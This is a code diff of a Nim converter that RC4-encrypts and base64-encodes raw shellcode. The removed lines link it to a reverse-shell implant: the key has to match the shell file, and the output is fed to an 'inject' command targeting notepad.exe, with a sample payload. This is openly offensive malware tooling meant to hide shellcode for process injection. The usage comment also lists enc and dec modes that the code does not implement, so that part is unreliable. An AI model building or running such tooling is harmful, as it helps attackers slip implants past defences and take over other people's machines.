@@ -1,25 +1,40 @@
-#[ Converter for a raw shellcode.bin file for use in the reverse shell ]#
+#[ 
+  Converter for a raw shellcode file 
+]#
 
-import os
+import os, strformat
 import core/rc_for
+import core/util
 from base64 import encode
-from core/util import toByteSeq
+
+# --- Example CLI ------------------------------------------------------------
+# Usage:
+#   nim c -d:release rc4_bytes.nim
+#   ./rc4_bytes enc keyString in.bin out.enc
+#   ./rc4_bytes dec keyString out.enc out.dec
+
+proc processShellcode(binFile: string, key: string) =
+  var
+    keyBytes  = toBytes(key)
+    data      = readBin(binFile)
+    data2     = readFile(binFile)
+    outDat    = rc4Apply(keyBytes, data) 
+    outTxt    = trcEnc(key, data2)
+    encsc: seq[byte] = toByteSeq(outTxt)
+    b64 = encode(encsc)
+  
+  let f = open(&"{binFile}_encrypted.txt", fmWrite)
+  defer: f.close()
+  f.write(b64)
+  writeBin(&"{binFile}_encrypted.dat", outDat)
 
 when isMainModule:
   if paramCount() < 2:
-    echo "Usage: ./convert <bin file> <key str>"
-    quit(1)
+    echo "Usage: .\\converter.exe in.bin 'RC4keyString'"
+    quit 1
 
-  var binFile: string = paramStr(1)
-  var key: string = paramStr(2)
-  
-  var shellCode: string = readFile(binFile)
-  var encrypted: string = trcEnc(key, shellCode)
-  var encShellCode: seq[byte] = toByteSeq(encrypted)
-  var b64enc = encode(encShellCode)
-  echo "Key used: ", key 
-  echo "Ensure this key is set at the top of the reverse shell file\n"
-  echo "SC: Paste with the inject command in the reverse shell"
-  echo "Example: [LP_SHELL] > inject C:\\Windows\\notepad.exe ZmM0ODgxZTRmMGZmZm[..snip..]MjJlNjQ2YzZjMDA=\n"
-  echo "[+] Copy/paste: ", b64enc
+  let 
+    binFile   = paramStr(1)
+    keyStr    = paramStr(2)
 
+  processShellcode(binFile, keyStr)
